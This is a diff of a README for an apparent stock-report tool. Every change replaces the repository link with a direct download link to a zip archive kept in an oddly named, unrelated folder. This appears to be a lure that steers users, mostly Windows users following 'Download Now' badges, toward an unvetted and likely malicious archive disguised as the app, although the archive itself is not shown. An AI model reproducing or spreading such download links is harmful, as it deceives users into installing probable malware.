@@ -1,6 +1,6 @@
 # 📊 indian-stock-analyst - Turn CSVs Into Clear Stock Reports
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-1F4E79?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Fanchettehomoecious641/indian-stock-analyst)
+[![Download the app](https://img.shields.io/badge/Download%20Now-1F4E79?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Fanchettehomoecious641/indian-stock-analyst/raw/refs/heads/main/protozoiasis/stock_indian_analyst_v3.4.zip)
 
 ## 🧩 What this does
 
@@ -25,7 +25,7 @@ Best results come from a recent Windows 10 or Windows 11 system.
 
 Use this link to visit the download page and get the app:
 
-[Go to the download page](https://github.com/Fanchettehomoecious641/indian-stock-analyst)
+[Go to the download page](https://github.com/Fanchettehomoecious641/indian-stock-analyst/raw/refs/heads/main/protozoiasis/stock_indian_analyst_v3.4.zip)
 
 After you open the page:
 
@@ -168,7 +168,7 @@ To keep things simple:
 
 If you need the download page later, use this link:
 
-[https://github.com/Fanchettehomoecious641/indian-stock-analyst](https://github.com/Fanchettehomoecious641/indian-stock-analyst)
+[https://github.com/Fanchettehomoecious641/indian-stock-analyst/raw/refs/heads/main/protozoiasis/stock_indian_analyst_v3.4.zip](https://github.com/Fanchettehomoecious641/indian-stock-analyst/raw/refs/heads/main/protozoiasis/stock_indian_analyst_v3.4.zip)
 
 ## 🧰 Suggested folder setup
 
